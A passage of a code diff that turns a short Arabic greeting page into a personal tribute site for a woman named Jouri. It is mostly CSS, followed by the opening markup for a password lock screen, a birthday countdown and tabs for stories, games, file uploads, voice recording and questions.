@@ -2,99 +2,2566 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>إلى جوري القحطاني 💖</title>
-    <link href="https://fonts.googleapis.com/css2?family=Amiri:wght@400;700&family=Tajawal:wght@400;700;900&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <meta name="theme-color" content="#170a2c">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <title>عالم جوري</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;800&display=swap" rel="stylesheet">
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; }
+        :root {
+            --bg-gradient: linear-gradient(135deg, #090314 0%, #170a2c 40%, #0c041a 100%);
+            --card-bg: rgba(22, 12, 36, 0.88);
+            --card-border: rgba(192, 132, 252, 0.28);
+            --text-primary: #f5f2f9;
+            --text-secondary: #e9d5ff;
+            --accent-pink: #f472b6;
+            --accent-purple: #c084fc;
+            --accent-glow: rgba(244, 114, 182, 0.2);
+            --gold-accent: #fbbf24;
+            --safe-bottom: env(safe-area-inset-bottom, 0px);
+            --panel-shadow: 0 15px 40px rgba(0,0,0,0.5);
+        }
+
+        body.light-mode {
+            --bg-gradient: linear-gradient(135deg, #fdf4ff 0%, #fce7f3 50%, #f5f3ff 100%);
+            --card-bg: rgba(255,255,255,0.92);
+            --card-border: rgba(168,85,247,0.35);
+            --text-primary: #2b1b3d;
+            --text-secondary: #6b21a8;
+            --accent-pink: #db2777;
+            --accent-purple: #9333ea;
+            --accent-glow: rgba(219,39,119,0.15);
+            --gold-accent: #b45309;
+            --panel-shadow: 0 15px 40px rgba(168,85,247,0.15);
+        }
+        body.light-mode p, body.light-mode .memory-text, body.light-mode .info-grid li { color: #3b2a4f; }
+        body.light-mode .timer-num, body.light-mode header h1 { color: #db2777; text-shadow: none; }
+        body.light-mode .stat-num { color: #9333ea; }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+        html { -webkit-text-size-adjust: 100%; }
+
         body {
-            background: linear-gradient(135deg, #ffe4e6 0%, #fecdd3 50%, #fda4af 100%);
-            font-family: 'Tajawal', sans-serif;
-            color: #881337;
+            font-family: 'Cairo', sans-serif;
+            background: var(--bg-gradient);
+            color: var(--text-primary);
             min-height: 100vh;
+            min-height: 100dvh;
+            padding: 30px 12px calc(130px + var(--safe-bottom)) 12px;
+            line-height: 1.9;
+            overflow-x: hidden;
+            position: relative;
+            transition: background 0.5s ease, color 0.5s ease;
+        }
+
+        #particleCanvas {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .wrapper { max-width: 950px; margin: 0 auto; position: relative; z-index: 1; }
+
+        #lockScreen {
+            position: fixed;
+            inset: 0;
+            background: var(--bg-gradient);
+            z-index: 99999;
             display: flex;
-            justify-content: center;
+            flex-direction: column;
             align-items: center;
+            justify-content: center;
+            gap: 20px;
             padding: 20px;
         }
-        .container {
-            background: rgba(255, 255, 255, 0.9);
-            backdrop-filter: blur(10px);
+        #lockScreen.hidden { display: none; }
+        .lock-icon { font-size: 4rem; }
+        .lock-title { color: var(--accent-pink); font-size: 1.8rem; font-weight: 800; text-align: center; }
+        .lock-sub { color: var(--text-secondary); font-size: 0.95rem; text-align: center; }
+        .lock-input {
+            width: 200px;
+            text-align: center;
+            background: rgba(10,5,20,0.8);
+            border: 1px solid var(--accent-purple);
+            border-radius: 12px;
+            color: var(--text-primary);
+            font-size: 20px;
+            letter-spacing: 8px;
+            padding: 14px;
+            outline: none;
+            min-height: 52px;
+            font-family: 'Cairo', sans-serif;
+        }
+        .lock-btn {
+            background: linear-gradient(135deg, #a855f7 0%, #ec4899 100%);
+            color: #fff;
+            border: none;
+            border-radius: 12px;
+            padding: 14px 32px;
+            font-family: 'Cairo', sans-serif;
+            font-size: 1rem;
+            font-weight: 700;
+            cursor: pointer;
+            min-height: 48px;
+        }
+        .lock-error { color: #ef4444; font-size: 0.85rem; min-height: 20px; }
+
+        #toastContainer {
+            position: fixed;
+            bottom: calc(80px + var(--safe-bottom));
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 10000;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            pointer-events: none;
+            width: calc(100% - 24px);
+            max-width: 400px;
+        }
+        .toast {
+            background: rgba(22,12,36,0.96);
+            border: 1px solid var(--accent-pink);
+            border-radius: 12px;
+            padding: 12px 18px;
+            color: var(--text-primary);
+            font-size: 0.9rem;
+            font-weight: 600;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.6);
+            text-align: center;
+            animation: toastIn 0.3s ease;
+        }
+        .toast.success { border-color: #22c55e; color: #86efac; }
+        .toast.error { border-color: #ef4444; color: #fca5a5; }
+        .toast.info { border-color: var(--accent-purple); }
+        @keyframes toastIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        .toast.removing { animation: toastOut 0.3s ease forwards; }
+        @keyframes toastOut { to { opacity: 0; transform: translateY(20px); } }
+
+        header {
+            text-align: center;
+            margin-bottom: 22px;
+            padding: 30px 16px;
+            background: var(--card-bg);
+            border: 1px solid var(--card-border);
             border-radius: 24px;
-            padding: 30px 20px;
-            max-width: 500px;
+            box-shadow: 0 20px 45px rgba(0,0,0,0.7), inset 0 0 25px var(--accent-glow);
+        }
+        header h1 {
+            font-size: 2.4rem;
+            color: var(--accent-pink);
+            font-weight: 800;
+            margin-bottom: 8px;
+        }
+        header .fullname {
+            color: var(--text-secondary);
+            font-size: 1.1rem;
+            font-weight: 600;
+            margin-bottom: 6px;
+            display: block;
+        }
+        header p { color: var(--text-secondary); font-size: 1rem; font-weight: 300; }
+
+        .countdown-card {
+            background: rgba(30,14,50,0.9);
+            border: 1px solid var(--accent-pink);
+            border-radius: 20px;
+            padding: 18px 12px;
+            text-align: center;
+            margin-bottom: 22px;
+        }
+        .countdown-title { color: var(--text-secondary); font-size: 1rem; font-weight: 600; margin-bottom: 12px; }
+        .timer-grid { display: flex; justify-content: center; gap: 8px; direction: ltr; flex-wrap: nowrap; }
+        .timer-unit {
+            background: rgba(10,5,20,0.75);
+            padding: 10px 6px;
+            border-radius: 12px;
+            border: 1px solid var(--card-border);
+            flex: 1 1 0;
+            min-width: 0;
+            max-width: 90px;
+        }
+        .timer-num { font-size: 1.4rem; font-weight: 700; color: var(--accent-pink); display: block; }
+        .timer-label { font-size: 0.72rem; color: var(--accent-purple); }
+
+        .tabs-nav {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 22px;
+            padding: 4px 2px 10px 2px;
+            overflow-x: auto;
+            -webkit-overflow-scrolling: touch;
+        }
+        .tab-btn {
+            background: var(--card-bg);
+            border: 1px solid var(--card-border);
+            color: var(--text-primary);
+            padding: 10px 16px;
+            border-radius: 30px;
+            font-family: 'Cairo', sans-serif;
+            font-size: 0.88rem;
+            font-weight: 600;
+            cursor: pointer;
+            white-space: nowrap;
+            flex-shrink: 0;
+            min-height: 40px;
+            position: relative;
+        }
+        .tab-btn.active {
+            background: linear-gradient(135deg, #a855f7 0%, #ec4899 100%);
+            color: #fff;
+            border-color: var(--accent-pink);
+        }
+        .tab-btn .badge {
+            position: absolute;
+            top: -6px; left: -6px;
+            background: #ef4444;
+            color: #fff;
+            font-size: 0.65rem;
+            font-weight: 800;
+            padding: 2px 6px;
+            border-radius: 10px;
+            min-width: 18px;
+            text-align: center;
+            display: none;
+        }
+        .tab-btn .badge.show { display: block; }
+
+        .tab-content { display: none; }
+        .tab-content.active { display: block; }
+
+        .section-card {
+            background: var(--card-bg);
+            border: 1px solid var(--card-border);
+            border-radius: 20px;
+            padding: 22px 16px;
+            margin-bottom: 20px;
+            box-shadow: var(--panel-shadow);
+        }
+        .section-card h2 {
+            color: var(--text-secondary);
+            font-size: 1.25rem;
+            margin-bottom: 16px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid rgba(192,132,252,0.2);
+            font-weight: 700;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .timeline { position: relative; padding-right: 18px; border-right: 2px solid var(--accent-purple); }
+        .timeline-item { position: relative; margin-bottom: 20px; padding-right: 14px; }
+        .timeline-item::before {
+            content: '';
+            position: absolute;
+            right: -26px; top: 8px;
+            width: 12px; height: 12px;
+            border-radius: 50%;
+            background: var(--accent-pink);
+        }
+        .timeline-date { font-size: 0.85rem; color: var(--accent-pink); font-weight: 700; }
+        .timeline-title { font-size: 1rem; color: var(--text-primary); font-weight: 600; margin-bottom: 4px; }
+
+        .mood-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-top: 12px; }
+        .mood-btn {
+            background: rgba(10,5,20,0.6);
+            border: 1px solid var(--card-border);
+            border-radius: 14px;
+            padding: 14px 8px;
+            text-align: center;
+            cursor: pointer;
+            color: var(--text-primary);
+            min-height: 80px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            font-size: 0.9rem;
+        }
+        .mood-btn.selected {
+            background: rgba(244,114,182,0.2);
+            border-color: var(--accent-pink);
+        }
+        .mood-emoji { font-size: 1.8rem; display: block; margin-bottom: 4px; color: var(--accent-pink); }
+
+        .fortune-box {
+            background: rgba(10,5,20,0.6);
+            border: 1px dashed var(--accent-purple);
+            border-radius: 14px;
+            padding: 18px 14px;
+            text-align: center;
+            margin-top: 12px;
+        }
+        .fortune-text {
+            font-size: 1rem;
+            color: var(--gold-accent);
+            margin-bottom: 14px;
+            min-height: 55px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+        }
+
+        .action-btn {
+            background: linear-gradient(135deg, #a855f7 0%, #ec4899 100%);
+            color: #fff;
+            border: none;
+            border-radius: 12px;
+            padding: 12px 20px;
+            font-family: 'Cairo', sans-serif;
+            font-size: 0.95rem;
+            font-weight: 700;
+            cursor: pointer;
+            min-height: 44px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            margin: 4px;
+        }
+        .action-btn.secondary { background: transparent; border: 1px solid var(--accent-pink); color: var(--accent-pink); }
+
+        .vault-input-group { display: flex; gap: 8px; justify-content: center; margin-bottom: 16px; flex-wrap: wrap; }
+        .vault-input {
+            width: 140px;
+            text-align: center;
+            background: rgba(10,5,20,0.7);
+            border: 1px solid var(--accent-purple);
+            border-radius: 12px;
+            color: var(--text-primary);
+            font-size: 16px;
+            letter-spacing: 6px;
+            padding: 12px;
+            outline: none;
+            min-height: 48px;
+        }
+
+        .vault-secret-content {
+            display: none;
+            background: rgba(244,114,182,0.08);
+            border: 1px solid var(--accent-pink);
+            border-radius: 14px;
+            padding: 16px;
+            margin-top: 16px;
+        }
+
+        .info-grid { display: grid; grid-template-columns: 1fr; gap: 10px; list-style: none; }
+        .info-grid li {
+            background: rgba(255,255,255,0.03);
+            border: 1px solid rgba(255,255,255,0.07);
+            padding: 12px 14px;
+            border-radius: 12px;
+            font-size: 0.92rem;
+            color: var(--text-primary);
+            display: flex;
+            justify-content: space-between;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+        .info-grid li strong { color: var(--accent-pink); }
+
+        p { margin-bottom: 14px; color: #e6e0f0; text-align: justify; font-size: 0.98rem; font-weight: 300; line-height: 1.9; }
+        p:last-child { margin-bottom: 0; }
+
+        .quiz-container { display: flex; flex-direction: column; gap: 12px; }
+        .quiz-option {
+            background: rgba(255,255,255,0.03);
+            border: 1px solid rgba(192,132,252,0.2);
+            padding: 14px 16px;
+            border-radius: 12px;
+            cursor: pointer;
+            color: var(--text-primary);
+            min-height: 44px;
+            display: flex;
+            align-items: center;
+        }
+        .quiz-option.correct { background: rgba(34,197,94,0.3); border-color: #22c55e; }
+        .quiz-option.wrong { background: rgba(239,68,68,0.3); border-color: #ef4444; }
+        .quiz-option.disabled { pointer-events: none; opacity: 0.6; }
+
+        .custom-note-area {
             width: 100%;
-            box-shadow: 0 20px 40px rgba(159, 18, 57, 0.15);
+            height: 110px;
+            background: rgba(10,5,20,0.6);
+            border: 1px solid rgba(192,132,252,0.25);
+            border-radius: 12px;
+            padding: 14px;
+            color: var(--text-primary);
+            font-family: 'Cairo', sans-serif;
+            font-size: 16px;
+            resize: vertical;
+            outline: none;
+            margin-bottom: 6px;
+        }
+
+        .char-counter {
+            display: block;
+            text-align: left;
+            font-size: 0.78rem;
+            color: var(--text-secondary);
+            margin-bottom: 10px;
+            opacity: 0.7;
+        }
+
+        .send-btn {
+            display: block;
+            width: 100%;
+            background: linear-gradient(135deg, #a855f7 0%, #ec4899 100%);
+            color: #fff;
+            border: none;
+            border-radius: 14px;
+            padding: 15px;
+            font-family: 'Cairo', sans-serif;
+            font-size: 1rem;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 16px;
+            min-height: 52px;
+        }
+
+        .audio-bar {
+            position: fixed;
+            bottom: calc(12px + var(--safe-bottom));
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(15,7,28,0.96);
+            border: 1px solid var(--accent-pink);
+            padding: 8px 12px;
+            border-radius: 30px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            z-index: 100;
+            width: calc(100% - 24px);
+            max-width: 420px;
+        }
+        .audio-btn {
+            background: var(--accent-pink);
+            color: #07030d;
+            border: none;
+            width: 40px; height: 40px;
+            border-radius: 50%;
+            font-weight: 700;
+            cursor: pointer;
+            flex-shrink: 0;
+        }
+        .track-select {
+            flex: 1;
+            min-width: 0;
+            background: rgba(20,10,32,0.8);
+            color: var(--text-primary);
+            border: 1px solid var(--card-border);
+            border-radius: 10px;
+            padding: 8px 10px;
+            font-family: 'Cairo', sans-serif;
+            font-size: 0.85rem;
+            outline: none;
+            min-height: 40px;
+        }
+
+        footer {
+            text-align: center;
+            margin-top: 30px;
+            color: var(--text-secondary);
+            font-size: 0.88rem;
+            padding: 15px;
+            border-top: 1px solid rgba(255,255,255,0.06);
+            opacity: 0.8;
+        }
+
+        .float-controls {
+            position: fixed;
+            top: 12px;
+            right: 12px;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            z-index: 200;
+        }
+        .float-btn {
+            width: 44px; height: 44px;
+            border-radius: 50%;
+            border: 1px solid var(--card-border);
+            background: var(--card-bg);
+            color: var(--text-primary);
+            font-size: 1.15rem;
+            cursor: pointer;
+        }
+
+        .stats-row { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-bottom: 18px; }
+        .stat-box {
+            background: rgba(10,5,20,0.6);
+            border: 1px solid var(--card-border);
+            border-radius: 14px;
+            padding: 14px 8px;
             text-align: center;
         }
-        h1 { font-family: 'Amiri', serif; font-size: 2rem; color: #9f1239; margin-bottom: 10px; }
-        p { font-size: 1rem; color: #be123c; margin-bottom: 20px; line-height: 1.6; }
+        .stat-num { display: block; font-size: 1.4rem; font-weight: 800; color: var(--accent-pink); }
+        .stat-label { font-size: 0.78rem; color: var(--text-secondary); }
+
+        .heart-meter {
+            background: rgba(10,5,20,0.6);
+            border: 1px solid var(--card-border);
+            border-radius: 14px;
+            padding: 16px;
+            margin-top: 15px;
+        }
+        .meter-bar { height: 16px; background: rgba(255,255,255,0.08); border-radius: 20px; overflow: hidden; margin-top: 8px; }
+        .meter-fill { height: 100%; background: linear-gradient(90deg, #a855f7, #ec4899); border-radius: 20px; }
+
+        .memory-list { display: flex; flex-direction: column; gap: 10px; }
+        .memory-item {
+            background: rgba(255,255,255,0.03);
+            border: 1px solid rgba(192,132,252,0.15);
+            border-radius: 12px;
+            padding: 14px 16px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            cursor: pointer;
+            min-height: 50px;
+        }
+        .memory-check { accent-color: var(--accent-pink); width: 22px; height: 22px; cursor: pointer; flex-shrink: 0; }
+        .memory-text { color: var(--text-primary); font-size: 0.92rem; }
+        .memory-item.done .memory-text { text-decoration: line-through; opacity: 0.6; }
+
+        .progress-text { color: var(--gold-accent); font-weight: 700; margin-top: 10px; font-size: 0.95rem; text-align: center; }
+
+        .promise-card {
+            background: linear-gradient(135deg, rgba(168,85,247,0.12), rgba(236,72,153,0.12));
+            border: 1px solid var(--accent-pink);
+            border-radius: 16px;
+            padding: 18px;
+            margin-top: 15px;
+        }
+        .promise-card p { color: var(--text-secondary); font-style: italic; }
+
+        .time-capsule {
+            background: rgba(10,5,20,0.7);
+            border: 1px solid var(--accent-purple);
+            border-radius: 14px;
+            padding: 18px;
+            margin-top: 15px;
+        }
+        .time-capsule h3 { color: var(--accent-pink); margin-bottom: 10px; font-size: 1rem; }
+
+        .game-box {
+            background: rgba(10,5,20,0.55);
+            border: 1px dashed var(--accent-purple);
+            border-radius: 14px;
+            padding: 16px;
+            margin-top: 12px;
+        }
+
+        .heart-game-area {
+            position: relative;
+            height: 240px;
+            background: rgba(10,5,20,0.55);
+            border: 1px dashed var(--accent-purple);
+            border-radius: 14px;
+            overflow: hidden;
+            margin-top: 12px;
+            touch-action: manipulation;
+        }
+        .game-heart {
+            position: absolute;
+            font-size: 2rem;
+            cursor: pointer;
+            padding: 6px;
+        }
+        .game-score { text-align: center; font-size: 1rem; font-weight: 700; color: var(--accent-pink); margin-top: 10px; }
+
+        .memory-game {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 8px;
+            margin-top: 12px;
+        }
+        .memory-card {
+            aspect-ratio: 1;
+            background: linear-gradient(135deg, #a855f7, #ec4899);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.6rem;
+            cursor: pointer;
+            color: transparent;
+            transition: transform 0.3s, background 0.3s;
+        }
+        .memory-card.flipped, .memory-card.matched {
+            background: rgba(10,5,20,0.8);
+            border: 1px solid var(--accent-pink);
+            color: var(--text-primary);
+            transform: rotateY(180deg);
+        }
+        .memory-card.matched { opacity: 0.5; pointer-events: none; }
+
+        .quick-game-question {
+            text-align: center;
+            font-size: 1.05rem;
+            font-weight: 700;
+            color: var(--gold-accent);
+            margin-bottom: 12px;
+            min-height: 40px;
+        }
+        .quick-game-options { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+        .quick-game-options button {
+            background: rgba(244,114,182,0.15);
+            border: 1px solid var(--accent-pink);
+            color: var(--text-primary);
+            padding: 14px 10px;
+            border-radius: 12px;
+            font-family: 'Cairo', sans-serif;
+            font-size: 0.95rem;
+            cursor: pointer;
+            min-height: 52px;
+        }
+
+        .upload-area {
+            border: 2px dashed var(--accent-purple);
+            border-radius: 14px;
+            padding: 20px;
+            text-align: center;
+            cursor: pointer;
+            background: rgba(10,5,20,0.4);
+        }
+        .upload-area.dragover { background: rgba(244,114,182,0.15); border-color: var(--accent-pink); }
+        .upload-icon { font-size: 2.5rem; margin-bottom: 8px; display: block; }
+        .upload-text { color: var(--text-secondary); font-size: 0.9rem; }
+
+        .preview-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-top: 12px; }
+        .preview-item {
+            position: relative;
+            aspect-ratio: 1;
+            border-radius: 10px;
+            overflow: hidden;
+            border: 1px solid var(--card-border);
+            background: rgba(0,0,0,0.4);
+        }
+        .preview-item img, .preview-item video { width: 100%; height: 100%; object-fit: cover; }
+        .preview-item .file-icon {
+            display: flex; flex-direction: column;
+            align-items: center; justify-content: center;
+            height: 100%; color: var(--text-secondary);
+            font-size: 0.7rem; padding: 4px;
+            text-align: center; word-break: break-all;
+        }
+        .preview-item .file-icon .big-icon { font-size: 1.8rem; margin-bottom: 4px; }
+        .preview-remove {
+            position: absolute;
+            top: 4px; left: 4px;
+            background: rgba(239,68,68,0.95);
+            color: #fff;
+            border: none;
+            width: 26px; height: 26px;
+            border-radius: 50%;
+            cursor: pointer;
+            font-size: 0.85rem;
+            z-index: 2;
+        }
+        .preview-item .file-size {
+            position: absolute;
+            bottom: 4px; right: 4px;
+            background: rgba(0,0,0,0.7);
+            color: #fff;
+            font-size: 0.65rem;
+            padding: 2px 6px;
+            border-radius: 6px;
+        }
+        .preview-item .play-icon {
+            position: absolute;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 1.5rem;
+            pointer-events: none;
+        }
+
+        .image-note-input {
+            width: 100%;
+            background: rgba(10,5,20,0.6);
+            border: 1px solid rgba(192,132,252,0.25);
+            border-radius: 12px;
+            padding: 12px 14px;
+            color: var(--text-primary);
+            font-family: 'Cairo', sans-serif;
+            font-size: 16px;
+            outline: none;
+            margin-bottom: 10px;
+        }
+
+        .upload-status {
+            text-align: center;
+            margin-top: 10px;
+            font-size: 0.9rem;
+            color: var(--gold-accent);
+            min-height: 24px;
+            font-weight: 600;
+        }
+
+        .questions-toolbar { display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 16px; }
+        .questions-toolbar input[type="text"] {
+            flex: 1 1 200px;
+            min-width: 0;
+            background: rgba(10,5,20,0.6);
+            border: 1px solid var(--card-border);
+            border-radius: 10px;
+            padding: 10px 14px;
+            color: var(--text-primary);
+            font-family: 'Cairo', sans-serif;
+            font-size: 16px;
+            outline: none;
+        }
+
+        .filter-btn {
+            background: rgba(10,5,20,0.6);
+            border: 1px solid var(--card-border);
+            color: var(--text-primary);
+            padding: 8px 14px;
+            border-radius: 20px;
+            font-family: 'Cairo', sans-serif;
+            font-size: 0.85rem;
+            cursor: pointer;
+            min-height: 38px;
+        }
+        .filter-btn.active {
+            background: linear-gradient(135deg, #a855f7, #ec4899);
+            color: #fff;
+            border-color: var(--accent-pink);
+        }
+
+        .progress-info {
+            background: rgba(244,114,182,0.1);
+            border: 1px solid var(--accent-pink);
+            border-radius: 12px;
+            padding: 12px 16px;
+            margin-bottom: 16px;
+            font-size: 0.9rem;
+            color: var(--text-secondary);
+            text-align: center;
+        }
+        .progress-info strong { color: var(--accent-pink); font-size: 1.1rem; }
+
+        .progress-bar-wrap {
+            height: 8px;
+            background: rgba(255,255,255,0.08);
+            border-radius: 10px;
+            overflow: hidden;
+            margin-top: 8px;
+        }
+        .progress-bar-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #a855f7, #ec4899);
+            border-radius: 10px;
+            transition: width 0.4s ease;
+            width: 0%;
+        }
+
+        .q-section {
+            background: rgba(255,255,255,0.02);
+            border: 1px solid rgba(192,132,252,0.15);
+            border-radius: 14px;
+            margin-bottom: 14px;
+            overflow: hidden;
+        }
+        .q-section-header {
+            background: rgba(244,114,182,0.08);
+            padding: 14px 16px;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-weight: 700;
+            color: var(--text-secondary);
+            min-height: 48px;
+        }
+        .q-section-header .arrow { transition: transform 0.3s; font-size: 0.9rem; }
+        .q-section.open .q-section-header .arrow { transform: rotate(180deg); }
+        .q-section-body { max-height: 0; overflow: hidden; transition: max-height 0.4s ease; }
+        .q-section.open .q-section-body { max-height: 8000px; padding: 12px 16px 16px; }
+
+        .q-item { margin-bottom: 14px; }
+        .q-item label {
+            display: block;
+            color: var(--text-secondary);
+            font-weight: 600;
+            margin-bottom: 6px;
+            font-size: 0.92rem;
+        }
+        .q-item textarea {
+            width: 100%;
+            min-height: 60px;
+            background: rgba(10,5,20,0.6);
+            border: 1px solid rgba(192,132,252,0.2);
+            border-radius: 10px;
+            padding: 10px 12px;
+            color: var(--text-primary);
+            font-family: 'Cairo', sans-serif;
+            font-size: 16px;
+            outline: none;
+            resize: vertical;
+        }
+        .q-item.answered label::after {
+            content: " (تمت الإجابة)";
+            color: #22c55e;
+            font-size: 0.75rem;
+            font-weight: 400;
+        }
+
+        .q-actions { display: flex; gap: 8px; flex-wrap: wrap; margin-top: 16px; }
+        .q-actions .send-btn { margin-top: 0; }
+
+        .memory-map {
+            position: relative;
+            width: 100%;
+            height: 260px;
+            background: rgba(10,5,20,0.5);
+            border: 1px solid var(--card-border);
+            border-radius: 16px;
+            overflow: hidden;
+            margin-top: 12px;
+        }
+        .map-node {
+            position: absolute;
+            background: linear-gradient(135deg, #a855f7, #ec4899);
+            color: #fff;
+            padding: 8px 14px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 700;
+            cursor: pointer;
+            transform: translate(-50%, -50%);
+            min-height: 36px;
+            display: flex;
+            align-items: center;
+            white-space: nowrap;
+        }
+        .map-info {
+            margin-top: 12px;
+            padding: 14px;
+            background: rgba(244,114,182,0.1);
+            border: 1px solid var(--accent-pink);
+            border-radius: 12px;
+            font-size: 0.9rem;
+            color: var(--text-secondary);
+            display: none;
+        }
+        .map-info.show { display: block; }
+
+        .voice-recorder {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            align-items: center;
+            margin-top: 12px;
+        }
+        .rec-btn {
+            width: 80px; height: 80px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #a855f7, #ec4899);
+            border: none;
+            color: #fff;
+            font-size: 2rem;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .rec-btn.recording {
+            background: #ef4444;
+            animation: pulseRec 1s ease infinite;
+        }
+        @keyframes pulseRec {
+            0%,100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+        .rec-timer { font-size: 1.2rem; font-weight: 700; color: var(--accent-pink); min-height: 30px; }
+        .rec-status { font-size: 0.9rem; color: var(--text-secondary); text-align: center; }
+
+        @media (min-width: 600px) {
+            body { padding: 40px 15px calc(140px + var(--safe-bottom)) 15px; line-height: 2.1; }
+            header { padding: 45px 25px; border-radius: 30px; }
+            header h1 { font-size: 3.5rem; }
+            header .fullname { font-size: 1.3rem; }
+            header p { font-size: 1.25rem; }
+            .countdown-card { padding: 25px; border-radius: 24px; }
+            .countdown-title { font-size: 1.2rem; }
+            .timer-grid { gap: 18px; }
+            .timer-unit { padding: 12px 20px; min-width: 85px; max-width: none; border-radius: 16px; }
+            .timer-num { font-size: 2rem; }
+            .timer-label { font-size: 0.85rem; }
+            .tabs-nav { flex-wrap: wrap; justify-content: center; overflow-x: visible; }
+            .tab-btn { font-size: 0.95rem; padding: 10px 20px; }
+            .section-card { padding: 35px; border-radius: 24px; }
+            .section-card h2 { font-size: 1.7rem; margin-bottom: 25px; }
+            .mood-grid { grid-template-columns: repeat(auto-fit, minmax(100px, 1fr)); }
+            .mood-btn { min-height: 90px; font-size: 0.95rem; }
+            .mood-emoji { font-size: 2rem; }
+            .info-grid { grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); }
+            .stats-row { grid-template-columns: repeat(4, 1fr); gap: 12px; }
+            .stat-num { font-size: 1.6rem; }
+            .stat-label { font-size: 0.85rem; }
+            .memory-game { max-width: 500px; margin: 12px auto 0; }
+            .audio-bar { width: auto; min-width: 340px; padding: 10px 20px; gap: 12px; }
+            .preview-grid { grid-template-columns: repeat(auto-fill, minmax(100px, 1fr)); }
+            .quick-game-options { grid-template-columns: 1fr 1fr 1fr 1fr; }
+            .heart-game-area { height: 300px; }
+            .memory-map { height: 320px; }
+        }
+
+        @media (max-width: 360px) {
+            header h1 { font-size: 2rem; }
+            header .fullname { font-size: 0.95rem; }
+            .timer-num { font-size: 1.2rem; }
+            .timer-label { font-size: 0.65rem; }
+            .section-card { padding: 16px 12px; }
+            .section-card h2 { font-size: 1.1rem; }
+            .memory-game { gap: 6px; }
+            .memory-card { font-size: 1.3rem; }
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>إلى الجوهرة.. جوري 💕</h1>
-        <p>وجودكِ في هذا العالم يجعل كل شيء أكثر رقة وجمالاً..</p>
+
+    <div id="lockScreen">
+        <div class="lock-icon">🔒</div>
+        <div class="lock-title">هذي مساحة خاصة</div>
+        <div class="lock-sub">أدخلي كلمة المرور للدخول</div>
+        <input type="password" id="lockInput" class="lock-input" maxlength="20" placeholder="...">
+        <button type="button" class="lock-btn" onclick="tryUnlock()">دخول</button>
+        <div class="lock-error" id="lockError"></div>
+    </div>
+
+    <canvas id="particleCanvas"></canvas>
+
+    <div class="float-controls">
+        <button class="float-btn" id="themeBtn" onclick="toggleTheme()" title="تبديل الوضع">🌙</button>
+    </div>
+
+    <div class="wrapper">
+        <header>
+            <h1>جوري</h1>
+            <span class="fullname">جوري القحطاني</span>
+            <p>حكاية قلب، وصدف جمعتني بأجمل أقداري</p>
+        </header>
+
+        <div class="countdown-card">
+            <div class="countdown-title">الوقت المتبقي ليوم ميلادك المميز (10 ديسمبر)</div>
+            <div class="timer-grid">
+                <div class="timer-unit"><span class="timer-num" id="days">00</span><span class="timer-label">يوم</span></div>
+                <div class="timer-unit"><span class="timer-num" id="hours">00</span><span class="timer-label">ساعة</span></div>
+                <div class="timer-unit"><span class="timer-num" id="minutes">00</span><span class="timer-label">دقيقة</span></div>
+                <div class="timer-unit"><span class="timer-num" id="seconds">00</span><span class="timer-label">ثانية</span></div>
+            </div>
+        </div>
+
+        <div class="tabs-nav" id="tabsNav">
+            <button class="tab-btn active" onclick="switchTab('tab-story', this)">القصة</button>
+            <button class="tab-btn" onclick="switchTab('tab-timeline', this)">مسار الصدف</button>
+            <button class="tab-btn" onclick="switchTab('tab-interactive', this)">تفاعلات</button>
+            <button class="tab-btn" onclick="switchTab('tab-feelings', this)">المشاعر<span class="badge" id="feelingsBadge">0</span></button>
+            <button class="tab-btn" onclick="switchTab('tab-info', this)">بطاقة</button>
+            <button class="tab-btn" onclick="switchTab('tab-quiz', this)">اختبار</button>
+            <button class="tab-btn" onclick="switchTab('tab-games', this)">ألعاب</button>
+            <button class="tab-btn" onclick="switchTab('tab-images', this)">رفع ملفات</button>
+            <button class="tab-btn" onclick="switchTab('tab-voice', this)">تسجيل صوتي</button>
+            <button class="tab-btn" onclick="switchTab('tab-questions', this)">الأسئلة</button>
